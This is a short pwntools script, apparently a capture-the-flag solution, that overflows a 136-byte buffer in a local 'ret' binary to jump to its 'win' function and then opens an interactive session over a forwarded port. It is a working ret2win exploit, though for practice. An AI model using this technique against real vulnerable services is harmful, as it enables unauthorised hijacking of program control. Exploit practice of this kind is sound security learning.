from pwn import *

exe = './ret'
elf = ELF(exe)

offset = 136	#offset found using gdb

payload = b"A"*offset
payload += p64(elf.symbols['win']) 	#win function address found with elf

io = remote('localhost',4444)		#connecting to our forwarded port

io.recvline();io.recvline();		#recieving the initial junk
io.sendline(payload)

io.interactive()
